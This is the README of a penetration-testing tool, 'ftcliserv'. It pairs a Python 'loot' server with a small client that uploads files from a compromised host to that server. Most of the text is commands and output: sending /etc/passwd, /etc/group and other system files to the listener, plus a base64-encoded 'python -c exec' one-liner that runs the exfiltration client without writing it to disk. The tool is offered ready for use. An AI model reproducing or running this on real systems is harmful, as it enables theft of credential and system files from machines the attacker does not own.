# ftcliserv: File Transfer Client-Server

Penetration testing supporting tool. Small footprint client able to upload files to dedicated server. Developed in order to be quickly able to fetch multiple files from server when there is no full blown shell session established.

Start server:

```sh
nme@kali:~/ftcs$ python ftserver.py 1234
[*] Listening on 0.0.0.0:1234 ...
```

Retrieved files will be stored in `loot/` directory (it will be automatically created if it is not present).

Cient usage:

```sh
$ cat ftclient.py | grep -i Usage
# Usage 1: python ftclient.py 127.0.0.1 1234 ///etc/passwd /etc/group
# Usage 2: echo python -c \'exec\(\"`cat ftclient.py | base64 | tr -d "\n"`\".decode\(\"base64\"\)\)\' ip port file1 [file2...]
```

No `..` are allowed in paths (absolute paths are allowed).

Client usage 1:

```sh
$ python ftclient.py 127.0.0.1 1234 /etc/passwd /etc/hostname
uploading /etc/passwd ... done
uploading /etc/hostname ... done
```

Server:

```sh
[ ] Connection from 127.0.0.1:45378 ...
[ ] Creating directory loot/etc
[ ] Creating file loot/etc/passwd
    .....
[*] loot/etc/passwd received.

[ ] Connection from 127.0.0.1:45380 ...
[ ] Creating file loot/etc/hostname
    ..
[*] loot/etc/hostname received.
```

Client usage 2:

```sh
$ echo python -c \'exec\(\"`cat ftclient.py | base64 | tr -d "\n"`\".decode\(\"base64\"\)\)\' ip port file1 [file2...]
python -c 'exec("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgdXNhZ2UgMTogcHl0aG9uIGZ0Y2xpZW50LnB5IDEyNy4wLjAuMSAxMjM0IGEvYi9jL3ggYS9iL2MvdGVzdHMudHh0IC8vL2V0Yy9wYXNzd2QKIyB1c2FnZSAyOiBlY2hvIHB5dGhvbiAtYyBcJ2V4ZWNcKFwiYGNhdCBmdGNsaWVudC5weSB8IGJhc2U2NCB8IHRyIC1kICJcbiJgXCIuZGVjb2RlXChcImJhc2U2NFwiXClcKVwnIGlwIHBvcnQgZmlsZTEgW2ZpbGUyLi4uXQppbXBvcnQgc3lzLHNvY2tldAppZiBsZW4oc3lzLmFyZ3YpPjM6CiAgICBmb3IgaSBpbiBzeXMuYXJndlszOl06CiAgICAgICAgcz1zb2NrZXQuc29ja2V0KCkKICAgICAgICBzLmNvbm5lY3QoKHN5cy5hcmd2WzFdLGludChzeXMuYXJndlsyXSksKSkKICAgICAgICBwcmludCAndXBsb2FkaW5nJyxpLCcuLi4nLAogICAgICAgIGM9cy5yZWN2KDEwMjQpCiAgICAgICAgaWYgYz09J2gnOgogICAgICAgICAgICBzLnNlbmRhbGwoaSkKICAgICAgICBjPXMucmVjdigxMDI0KQogICAgICAgIGlmIGM9PSdiJzoKICAgICAgICAgICAgd2l0aCBvcGVuKGksJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgeD1mLnJlYWQoMTAyNCkKICAgICAgICAgICAgICAgICAgICBpZiB4OgogICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmQoeCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBwcmludCAnZG9uZScK".decode("base64"))' ip port file1 [file2...]
$ python -c 'exec("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgdXNhZ2UgMTogcHl0aG9uIGZ0Y2xpZW50LnB5IDEyNy4wLjAuMSAxMjM0IGEvYi9jL3ggYS9iL2MvdGVzdHMudHh0IC8vL2V0Yy9wYXNzd2QKIyB1c2FnZSAyOiBlY2hvIHB5dGhvbiAtYyBcJ2V4ZWNcKFwiYGNhdCBmdGNsaWVudC5weSB8IGJhc2U2NCB8IHRyIC1kICJcbiJgXCIuZGVjb2RlXChcImJhc2U2NFwiXClcKVwnIGlwIHBvcnQgZmlsZTEgW2ZpbGUyLi4uXQppbXBvcnQgc3lzLHNvY2tldAppZiBsZW4oc3lzLmFyZ3YpPjM6CiAgICBmb3IgaSBpbiBzeXMuYXJndlszOl06CiAgICAgICAgcz1zb2NrZXQuc29ja2V0KCkKICAgICAgICBzLmNvbm5lY3QoKHN5cy5hcmd2WzFdLGludChzeXMuYXJndlsyXSksKSkKICAgICAgICBwcmludCAndXBsb2FkaW5nJyxpLCcuLi4nLAogICAgICAgIGM9cy5yZWN2KDEwMjQpCiAgICAgICAgaWYgYz09J2gnOgogICAgICAgICAgICBzLnNlbmRhbGwoaSkKICAgICAgICBjPXMucmVjdigxMDI0KQogICAgICAgIGlmIGM9PSdiJzoKICAgICAgICAgICAgd2l0aCBvcGVuKGksJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgeD1mLnJlYWQoMTAyNCkKICAgICAgICAgICAgICAgICAgICBpZiB4OgogICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmQoeCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBwcmludCAnZG9uZScK".decode("base64"))' 127.0.0.1 1234 /etc/group /etc/rc.local
uploading /etc/group ... done
uploading /etc/rc.local ... done
```

Server:

```sh
[ ] Connection from 127.0.0.1:45388 ...
[ ] Creating file loot/etc/group
    ...
[*] loot/etc/group received.

[ ] Connection from 127.0.0.1:45390 ...
[ ] Creating file loot/etc/rc.local
    ..
[*] loot/etc/rc.local received.
^C
```

Received files in `loot/` directory:

```sh
$ find loot/
loot/
loot/etc
loot/etc/passwd
loot/etc/rc.local
loot/etc/hostname
loot/etc/group
```

## License

[MIT License](LICENSE)
